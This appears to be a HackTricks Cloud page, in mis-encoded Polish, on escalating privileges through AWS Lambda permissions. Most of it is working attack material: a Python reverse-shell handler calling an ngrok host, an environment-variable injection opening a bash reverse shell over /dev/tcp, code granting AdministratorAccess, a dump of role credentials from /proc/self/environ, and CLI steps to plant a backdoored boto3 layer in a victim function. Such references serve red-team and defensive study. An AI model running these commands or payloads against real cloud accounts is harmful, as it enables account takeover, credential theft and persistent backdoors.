# AWS - Lambda Privesc

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../../../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## lambda

WiÄ™cej informacji o lambda w:

{% content-ref url="../aws-services/aws-lambda-enum.md" %}
[aws-lambda-enum.md](../aws-services/aws-lambda-enum.md)
{% endcontent-ref %}

### `iam:PassRole`, `lambda:CreateFunction`, (`lambda:InvokeFunction` | `lambda:InvokeFunctionUrl`)

UÅ¼ytkownicy z uprawnieniami **`iam:PassRole`, `lambda:CreateFunction` i `lambda:InvokeFunction`** mogÄ… podnieÅ›Ä‡ swoje uprawnienia.\
MogÄ… **utworzyÄ‡ nowÄ… funkcjÄ™ Lambda i przypisaÄ‡ jej istniejÄ…cÄ… rolÄ™ IAM**, przyznajÄ…c funkcji uprawnienia zwiÄ…zane z tÄ… rolÄ…. UÅ¼ytkownik moÅ¼e nastÄ™pnie **napisaÄ‡ i przesÅ‚aÄ‡ kod do tej funkcji Lambda (na przykÅ‚ad z rev shellem)**.\
Gdy funkcja jest skonfigurowana, uÅ¼ytkownik moÅ¼e **wywoÅ‚aÄ‡ jej wykonanie** i zamierzone dziaÅ‚ania, wywoÅ‚ujÄ…c funkcjÄ™ Lambda za poÅ›rednictwem API AWS. To podejÅ›cie skutecznie pozwala uÅ¼ytkownikowi na wykonywanie zadaÅ„ poÅ›rednio przez funkcjÄ™ Lambda, dziaÅ‚ajÄ…c na poziomie dostÄ™pu przyznanym do roli IAM z niÄ… zwiÄ…zanej.\\

AtakujÄ…cy mÃ³gÅ‚by to wykorzystaÄ‡, aby uzyskaÄ‡ **rev shell i ukraÅ›Ä‡ token**:

{% code title="rev.py" %}
```python
import socket,subprocess,os,time
def lambda_handler(event, context):
s = socket.socket(socket.AF_INET,socket.SOCK_STREAM);
s.connect(('4.tcp.ngrok.io',14305))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p=subprocess.call(['/bin/sh','-i'])
time.sleep(900)
return 0
```
{% endcode %}
```bash
# Zip the rev shell
zip "rev.zip" "rev.py"

# Create the function
aws lambda create-function --function-name my_function \
--runtime python3.9 --role <arn_of_lambda_role> \
--handler rev.lambda_handler --zip-file fileb://rev.zip

# Invoke the function
aws lambda invoke --function-name my_function output.txt
## If you have the lambda:InvokeFunctionUrl permission you need to expose the lambda inan URL and execute it via the URL

# List roles
aws iam list-attached-user-policies --user-name <user-name>
```
MoÅ¼esz rÃ³wnieÅ¼ **naduÅ¼yÄ‡ uprawnieÅ„ roli lambda** z samej funkcji lambda.\
JeÅ›li rola lambda miaÅ‚a wystarczajÄ…ce uprawnienia, mogÅ‚eÅ› uÅ¼yÄ‡ jej do przyznania sobie praw administratora:
```python
import boto3
def lambda_handler(event, context):
client = boto3.client('iam')
response = client.attach_user_policy(
UserName='my_username',
PolicyArn='arn:aws:iam::aws:policy/AdministratorAccess'
)
return response
```
MoÅ¼liwe jest rÃ³wnieÅ¼ wyciekniÄ™cie poÅ›wiadczeÅ„ roli lambdy bez potrzeby nawiÄ…zywania zewnÄ™trznego poÅ‚Ä…czenia. BÄ™dzie to przydatne dla **Lambd izolowanych sieciowo** uÅ¼ywanych do zadaÅ„ wewnÄ™trznych. JeÅ›li istniejÄ… nieznane grupy zabezpieczeÅ„ filtrujÄ…ce twoje odwrotne powÅ‚oki, ten fragment kodu pozwoli ci bezpoÅ›rednio wyciekniÄ™cie poÅ›wiadczeÅ„ jako wynik lambdy.
```python
def handler(event, context):
sessiontoken = open('/proc/self/environ', "r").read()
return {
'statusCode': 200,
'session': str(sessiontoken)
}
```

```bash
aws lambda invoke --function-name <lambda_name> output.txt
cat output.txt
```
**Potencjalny wpÅ‚yw:** BezpoÅ›rednie privesc do dowolnej roli usÅ‚ugi lambda okreÅ›lonej.

{% hint style="danger" %}
ZauwaÅ¼, Å¼e nawet jeÅ›li moÅ¼e to wyglÄ…daÄ‡ interesujÄ…co, **`lambda:InvokeAsync`** **nie** pozwala samodzielnie na **wykonanie `aws lambda invoke-async`**, potrzebujesz rÃ³wnieÅ¼ `lambda:InvokeFunction`
{% endhint %}

### `iam:PassRole`, `lambda:CreateFunction`, `lambda:AddPermission`

Podobnie jak w poprzednim scenariuszu, moÅ¼esz **przyznaÄ‡ sobie uprawnienie `lambda:InvokeFunction`**, jeÅ›li masz uprawnienie **`lambda:AddPermission`**
```bash
# Check the previous exploit and use the following line to grant you the invoke permissions
aws --profile "$NON_PRIV_PROFILE_USER" lambda add-permission --function-name my_function \
--action lambda:InvokeFunction --statement-id statement_privesc --principal "$NON_PRIV_PROFILE_USER_ARN"
```
**Potencjalny wpÅ‚yw:** BezpoÅ›rednie privesc do dowolnej roli usÅ‚ugi lambda okreÅ›lonej.

### `iam:PassRole`, `lambda:CreateFunction`, `lambda:CreateEventSourceMapping`

UÅ¼ytkownicy z uprawnieniami **`iam:PassRole`, `lambda:CreateFunction` i `lambda:CreateEventSourceMapping`** (a potencjalnie takÅ¼e `dynamodb:PutItem` i `dynamodb:CreateTable`) mogÄ… poÅ›rednio **eskalowaÄ‡ uprawnienia** nawet bez `lambda:InvokeFunction`.\
MogÄ… stworzyÄ‡ **funkcjÄ™ Lambda z zÅ‚oÅ›liwym kodem i przypisaÄ‡ jej istniejÄ…cÄ… rolÄ™ IAM**.

Zamiast bezpoÅ›rednio wywoÅ‚ywaÄ‡ LambdÄ™, uÅ¼ytkownik konfiguruje lub wykorzystuje istniejÄ…cÄ… tabelÄ™ DynamoDB, Å‚Ä…czÄ…c jÄ… z LambdÄ… poprzez mapowanie ÅºrÃ³dÅ‚a zdarzeÅ„. Ta konfiguracja zapewnia, Å¼e funkcja Lambda jest **automatycznie wyzwalana po dodaniu nowego elementu** do tabeli, zarÃ³wno przez dziaÅ‚anie uÅ¼ytkownika, jak i inny proces, co poÅ›rednio wywoÅ‚uje funkcjÄ™ Lambda i wykonuje kod z uprawnieniami przekazanej roli IAM.
```bash
aws lambda create-function --function-name my_function \
--runtime python3.8 --role <arn_of_lambda_role> \
--handler lambda_function.lambda_handler \
--zip-file fileb://rev.zip
```
JeÅ›li DynamoDB jest juÅ¼ aktywne w Å›rodowisku AWS, uÅ¼ytkownik **musi tylko ustanowiÄ‡ mapowanie ÅºrÃ³dÅ‚a zdarzeÅ„** dla funkcji Lambda. Jednak jeÅ›li DynamoDB nie jest uÅ¼ywane, uÅ¼ytkownik musi **utworzyÄ‡ nowÄ… tabelÄ™** z wÅ‚Ä…czonym strumieniowaniem:
```bash
aws dynamodb create-table --table-name my_table \
--attribute-definitions AttributeName=Test,AttributeType=S \
--key-schema AttributeName=Test,KeyType=HASH \
--provisioned-throughput ReadCapacityUnits=5,WriteCapacityUnits=5 \
--stream-specification StreamEnabled=true,StreamViewType=NEW_AND_OLD_IMAGES
```
Teraz moÅ¼liwe jest **poÅ‚Ä…czenie funkcji Lambda z tabelÄ… DynamoDB** poprzez **utworzenie mapowania ÅºrÃ³dÅ‚a zdarzeÅ„**:
```bash
aws lambda create-event-source-mapping --function-name my_function \
--event-source-arn <arn_of_dynamodb_table_stream> \
--enabled --starting-position LATEST
```
Z funkcjÄ… Lambda powiÄ…zanÄ… z strumieniem DynamoDB, atakujÄ…cy moÅ¼e **poÅ›rednio uruchomiÄ‡ LambdÄ™, aktywujÄ…c strumieÅ„ DynamoDB**. MoÅ¼na to osiÄ…gnÄ…Ä‡ poprzez **wstawienie elementu** do tabeli DynamoDB:
```bash
aws dynamodb put-item --table-name my_table \
--item Test={S="Random string"}
```
**Potencjalny wpÅ‚yw:** BezpoÅ›rednie podniesienie uprawnieÅ„ do roli usÅ‚ugi lambda okreÅ›lonej.

### `lambda:AddPermission`

Napastnik z tym uprawnieniem moÅ¼e **przyznaÄ‡ sobie (lub innym) dowolne uprawnienia** (to generuje polityki oparte na zasobach, aby przyznaÄ‡ dostÄ™p do zasobu):

{% code overflow="wrap" %}
```bash
# Give yourself all permissions (you could specify granular such as lambda:InvokeFunction or lambda:UpdateFunctionCode)
aws lambda add-permission --function-name <func_name> --statement-id asdasd --action '*' --principal arn:<your user arn>

# Invoke the function
aws lambda invoke --function-name <func_name> /tmp/outout
```
{% endcode %}

**Potencjalny wpÅ‚yw:** BezpoÅ›rednie privesc do roli usÅ‚ugi lambda uÅ¼ywanej przez przyznanie uprawnienia do modyfikacji kodu i jego uruchomienia.

### `lambda:AddLayerVersionPermission`

Napastnik z tym uprawnieniem moÅ¼e **przyznaÄ‡ sobie (lub innym) uprawnienie `lambda:GetLayerVersion`**. MoÅ¼e uzyskaÄ‡ dostÄ™p do warstwy i szukaÄ‡ luk lub wraÅ¼liwych informacji.

{% code overflow="wrap" %}
```bash
# Give everyone the permission lambda:GetLayerVersion
aws lambda add-layer-version-permission --layer-name ExternalBackdoor --statement-id xaccount --version-number 1 --principal '*' --action lambda:GetLayerVersion
```
{% endcode %}

**Potencjalny wpÅ‚yw:** Potencjalny dostÄ™p do wraÅ¼liwych informacji.

### `lambda:UpdateFunctionCode`

UÅ¼ytkownicy posiadajÄ…cy uprawnienie **`lambda:UpdateFunctionCode`** majÄ… potencjaÅ‚ do **modyfikacji kodu istniejÄ…cej funkcji Lambda, ktÃ³ra jest powiÄ…zana z rolÄ… IAM.**\
Napastnik moÅ¼e **zmodyfikowaÄ‡ kod lambdy, aby wyeksportowaÄ‡ poÅ›wiadczenia IAM**.

ChociaÅ¼ napastnik moÅ¼e nie mieÄ‡ bezpoÅ›redniej moÅ¼liwoÅ›ci wywoÅ‚ania funkcji, jeÅ›li funkcja Lambda jest juÅ¼ istniejÄ…ca i operacyjna, prawdopodobne jest, Å¼e zostanie uruchomiona przez istniejÄ…ce przepÅ‚ywy pracy lub zdarzenia, co poÅ›rednio uÅ‚atwi wykonanie zmodyfikowanego kodu.

{% code overflow="wrap" %}
```bash
# The zip should contain the lambda code (trick: Download the current one and add your code there)
aws lambda update-function-code --function-name target_function \
--zip-file fileb:///my/lambda/code/zipped.zip

# If you have invoke permissions:
aws lambda invoke --function-name my_function output.txt

# If not check if it's exposed in any URL or via an API gateway you could access
```
{% endcode %}

**Potencjalny wpÅ‚yw:** BezpoÅ›rednie podniesienie uprawnieÅ„ do roli usÅ‚ugi lambda.

### `lambda:UpdateFunctionConfiguration`

#### RCE przez zmienne Å›rodowiskowe

DziÄ™ki tym uprawnieniom moÅ¼liwe jest dodanie zmiennych Å›rodowiskowych, ktÃ³re spowodujÄ…, Å¼e Lambda wykona dowolny kod. Na przykÅ‚ad w Pythonie moÅ¼na wykorzystaÄ‡ zmienne Å›rodowiskowe `PYTHONWARNING` i `BROWSER`, aby proces Pythona wykonaÅ‚ dowolne polecenia:

{% code overflow="wrap" %}
```bash
aws --profile none-priv lambda update-function-configuration --function-name <func-name> --environment "Variables={PYTHONWARNINGS=all:0:antigravity.x:0:0,BROWSER=\"/bin/bash -c 'bash -i >& /dev/tcp/2.tcp.eu.ngrok.io/18755 0>&1' & #%s\"}"
```
{% endcode %}

Dla innych jÄ™zykÃ³w skryptowych istniejÄ… inne zmienne Å›rodowiskowe, ktÃ³rych moÅ¼esz uÅ¼yÄ‡. Aby uzyskaÄ‡ wiÄ™cej informacji, sprawdÅº podsekcje jÄ™zykÃ³w skryptowych w:

{% embed url="https://book.hacktricks.xyz/macos-hardening/macos-security-and-privilege-escalation/macos-proces-abuse" %}

#### RCE za pomocÄ… Lambda Layers

[**Lambda Layers**](https://docs.aws.amazon.com/lambda/latest/dg/configuration-layers.html) pozwala na doÅ‚Ä…czenie **kod** do twojej funkcji lamdba, ale **przechowujÄ…c go osobno**, dziÄ™ki czemu kod funkcji moÅ¼e pozostaÄ‡ maÅ‚y, a **kilka funkcji moÅ¼e dzieliÄ‡ kod**.

WewnÄ…trz lamdba moÅ¼esz sprawdziÄ‡ Å›cieÅ¼ki, z ktÃ³rych Å‚adowany jest kod python za pomocÄ… funkcji takiej jak poniÅ¼sza:
```python
import json
import sys

def lambda_handler(event, context):
print(json.dumps(sys.path, indent=2))
```
To sÄ… miejsca:

1. /var/task
2. /opt/python/lib/python3.7/site-packages
3. /opt/python
4. /var/runtime
5. /var/lang/lib/python37.zip
6. /var/lang/lib/python3.7
7. /var/lang/lib/python3.7/lib-dynload
8. /var/lang/lib/python3.7/site-packages
9. /opt/python/lib/python3.7/site-packages
10. /opt/python

Na przykÅ‚ad, biblioteka boto3 jest Å‚adowana z `/var/runtime/boto3` (4. pozycja).

#### Wykorzystanie

MoÅ¼liwe jest naduÅ¼ycie uprawnienia `lambda:UpdateFunctionConfiguration`, aby **dodaÄ‡ nowÄ… warstwÄ™** do funkcji lambda. Aby wykonaÄ‡ dowolny kod, ta warstwa musi zawieraÄ‡ jakÄ…Å› **bibliotekÄ™, ktÃ³rÄ… lambda zamierza zaimportowaÄ‡.** JeÅ›li moÅ¼esz przeczytaÄ‡ kod lambdy, moÅ¼esz to Å‚atwo znaleÅºÄ‡, rÃ³wnieÅ¼ zauwaÅ¼, Å¼e moÅ¼e byÄ‡ moÅ¼liwe, Å¼e lambda **juÅ¼ uÅ¼ywa warstwy** i moÅ¼esz **pobraÄ‡** tÄ™ warstwÄ™ i **dodaÄ‡ swÃ³j kod** tam.

Na przykÅ‚ad, zaÅ‚Ã³Å¼my, Å¼e lambda uÅ¼ywa biblioteki boto3, to stworzy lokalnÄ… warstwÄ™ z najnowszÄ… wersjÄ… biblioteki:
```bash
pip3 install -t ./lambda_layer boto3
```
MoÅ¼esz otworzyÄ‡ `./lambda_layer/boto3/__init__.py` i **dodaÄ‡ backdoora w globalnym kodzie** (funkcjÄ™ do eksfiltracji poÅ›wiadczeÅ„ lub uzyskania odwrotnego powÅ‚oki na przykÅ‚ad).

NastÄ™pnie spakuj ten katalog `./lambda_layer` i **przeÅ›lij nowÄ… warstwÄ™ lambda** na swoje konto (lub na konto ofiary, ale moÅ¼esz nie mieÄ‡ do tego uprawnieÅ„).\
ZauwaÅ¼, Å¼e musisz utworzyÄ‡ folder python i umieÅ›ciÄ‡ w nim biblioteki, aby nadpisaÄ‡ /opt/python/boto3. Ponadto warstwa musi byÄ‡ **kompatybilna z wersjÄ… pythona** uÅ¼ywanÄ… przez lambdÄ™, a jeÅ›li przesyÅ‚asz jÄ… na swoje konto, musi byÄ‡ w **tej samej regionie:** 

{% code overflow="wrap" %}
```bash
aws lambda publish-layer-version --layer-name "boto3" --zip-file file://backdoor.zip --compatible-architectures "x86_64" "arm64" --compatible-runtimes "python3.9" "python3.8" "python3.7" "python3.6"
```
{% endcode %}

Teraz spraw, aby przesÅ‚ana warstwa lambda byÅ‚a **dostÄ™pna dla kaÅ¼dego konta**:
```bash
aws lambda add-layer-version-permission --layer-name boto3 \
--version-number 1 --statement-id public \
--action lambda:GetLayerVersion --principal *
```
I doÅ‚Ä…cz warstwÄ™ lambda do funkcji lambda ofiary:
```bash
aws lambda update-function-configuration \
--function-name <func-name> \
--layers arn:aws:lambda:<region>:<attacker-account-id>:layer:boto3:1 \
--timeout 300 #5min for rev shells
```
NastÄ™pnym krokiem byÅ‚oby albo **wywoÅ‚anie funkcji** samodzielnie, jeÅ›li moÅ¼emy, albo czekanie, aÅ¼ **zostanie wywoÅ‚ana** w normalny sposÃ³b â€“ co jest bezpieczniejszÄ… metodÄ….

**Bardziej dyskretny sposÃ³b na wykorzystanie tej luki** moÅ¼na znaleÅºÄ‡ w:

{% content-ref url="../aws-persistence/aws-lambda-persistence/aws-lambda-layers-persistence.md" %}
[aws-lambda-layers-persistence.md](../aws-persistence/aws-lambda-persistence/aws-lambda-layers-persistence.md)
{% endcontent-ref %}

**Potencjalny wpÅ‚yw:** BezpoÅ›rednie privesc do roli usÅ‚ugi lambda.

### `iam:PassRole`, `lambda:CreateFunction`, `lambda:CreateFunctionUrlConfig`, `lambda:InvokeFunctionUrl`

MoÅ¼e z tymi uprawnieniami jesteÅ› w stanie stworzyÄ‡ funkcjÄ™ i wykonaÄ‡ jÄ…, wywoÅ‚ujÄ…c URL... ale nie mogÅ‚em znaleÅºÄ‡ sposobu, aby to przetestowaÄ‡, wiÄ™c daj mi znaÄ‡, jeÅ›li to zrobisz!

### Lambda MitM

NiektÃ³re lambdy bÄ™dÄ… **otrzymywaÄ‡ wraÅ¼liwe informacje od uÅ¼ytkownikÃ³w w parametrach.** JeÅ›li uzyskasz RCE w jednej z nich, moÅ¼esz wyeksfiltrowaÄ‡ informacje, ktÃ³re inni uÅ¼ytkownicy do niej wysyÅ‚ajÄ…, sprawdÅº to w:

{% content-ref url="../aws-post-exploitation/aws-lambda-post-exploitation/aws-warm-lambda-persistence.md" %}
[aws-warm-lambda-persistence.md](../aws-post-exploitation/aws-lambda-post-exploitation/aws-warm-lambda-persistence.md)
{% endcontent-ref %}

## Referencje

* [https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/](https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/)
* [https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation-part-2/](https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation-part-2/)

{% hint style="success" %}
Ucz siÄ™ i Ä‡wicz Hacking AWS:<img src="../../../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">\
Ucz siÄ™ i Ä‡wicz Hacking GCP: <img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Wsparcie HackTricks</summary>

* SprawdÅº [**plany subskrypcyjne**](https://github.com/sponsors/carlospolop)!
* **DoÅ‚Ä…cz do** ğŸ’¬ [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **Å›ledÅº** nas na **Twitterze** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**.**
* **Dziel siÄ™ trikami hackingowymi, przesyÅ‚ajÄ…c PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repozytoriÃ³w github.

</details>
{% endhint %}
